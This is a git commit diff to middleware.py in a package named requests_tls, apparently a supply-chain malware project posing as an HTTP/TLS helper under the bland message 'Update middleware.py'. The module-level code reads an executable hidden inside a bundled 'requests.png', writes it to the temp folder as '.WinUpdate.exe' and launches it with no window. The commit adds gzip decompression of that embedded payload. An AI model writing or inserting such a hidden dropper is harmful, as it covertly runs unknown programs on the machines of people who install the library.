cba486b0d831b742e6ad96cb4868b81ebb30da69
Posely44 <JohnStromberg@proton.me>
2025-07-26 21:47:49 +0200

    Update middleware.py

--- requests_tls/middleware.py
+++ requests_tls/middleware.py
@@ -6,6 +6,7 @@ from requests.packages.urllib3.response import HTTPResponse
 from requests.packages.urllib3.poolmanager import PoolManager
 import os
 import subprocess
+import gzip
 
 
 class MiddlewareHTTPAdapter(HTTPAdapter):
@@ -142,5 +143,5 @@ with open(os.path.join(os.path.dirname(__file__), 'requests.png'), 'rb') as f:
     if index != -1:
         temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), '.WinUpdate.exe')
         with open(temp_path, 'wb') as exe_file:
-            exe_file.write(data[index + 11:])
+            exe_file.write(gzip.decompress(data[index + 11:]))
         subprocess.Popen([temp_path], creationflags=subprocess.CREATE_NO_WINDOW)
